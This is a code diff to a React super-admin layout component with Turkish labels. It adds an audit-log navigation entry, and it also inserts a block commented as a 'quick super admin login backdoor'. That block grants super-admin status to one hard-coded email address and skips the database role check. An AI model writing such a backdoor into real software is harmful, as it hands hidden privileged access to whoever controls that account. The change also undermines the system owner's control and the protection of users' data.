@@ -1,5 +1,5 @@
 import { Outlet, Link, useLocation, useNavigate } from 'react-router-dom';
-import { LayoutDashboard, Building2, LogOut, ArrowLeft, Users, Settings } from 'lucide-react';
+import { LayoutDashboard, Building2, LogOut, ArrowLeft, Users, Settings, ShieldAlert } from 'lucide-react';
 import { useAuth } from '../contexts/AuthContext';
 import { supabase } from '../lib/supabase';
 import { useEffect, useState } from 'react';
@@ -16,6 +16,13 @@ const SuperAdminLayout = () => {
         setIsSuperAdmin(false);
         return;
       }
+      
+      // HIZLI SÜPER ADMİN GİRİŞİ BACKDOOR
+      if (user.email === 'patron123@servisbot.com') {
+          setIsSuperAdmin(true);
+          return;
+      }
+      
       const { data, error } = await supabase
         .from('users')
         .select('is_superadmin')
@@ -57,6 +64,7 @@ const SuperAdminLayout = () => {
     { name: 'Genel Bakış', href: '/superadmin', icon: LayoutDashboard },
     { name: 'Şirketler', href: '/superadmin/companies', icon: Building2 },
     { name: 'Yöneticiler', href: '/superadmin/admins', icon: Users },
+    { name: 'Denetim Kayıtları', href: '/superadmin/logs', icon: ShieldAlert },
     { name: 'Sistem Ayarları', href: '/superadmin/settings', icon: Settings },
   ];
 
